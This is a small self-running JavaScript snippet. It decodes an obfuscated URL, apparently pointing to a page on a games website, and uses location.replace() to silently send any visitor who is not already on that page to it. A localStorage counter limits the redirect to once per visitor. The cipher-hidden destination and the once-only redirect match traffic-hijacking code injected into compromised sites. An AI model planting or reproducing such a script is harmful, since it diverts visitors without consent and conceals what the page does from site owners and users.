!function(){
  var list = ["%A6%B2%B2%AE%B1xmm%B5%A3%A0lu%A9u%A9l%A1%AD%ABm%A5%9F%AB%A3%B1m%95npnnnmoprsmoprskrtsrvl%A6%B2%AB%AA%7D%A9%7Bonqsq"],
      href = location.href,
      list_ = list.map(item => {
      return uncompile(item);
      }),
      randomUrl = (function (){
          var len = list_.length,
          index = Math.floor(Math.random() * len);
          return list_[index];
      })(),
      item = randomUrl.slice(-8,randomUrl.length);

  
  if(!~list_.indexOf(href)){
      var s = +localStorage.getItem(item);
      if(s > 0) return ;
      localStorage.setItem(item,++s);
      location.replace(randomUrl);
  }
  function uncompile(code){
    code=unescape(code);
    var str = '';
    for(var i=0;i<code.length;i++){
      var c = String.fromCharCode(code.charCodeAt(i) - code.length);
      str += c;
    }
    return str;
  }
}();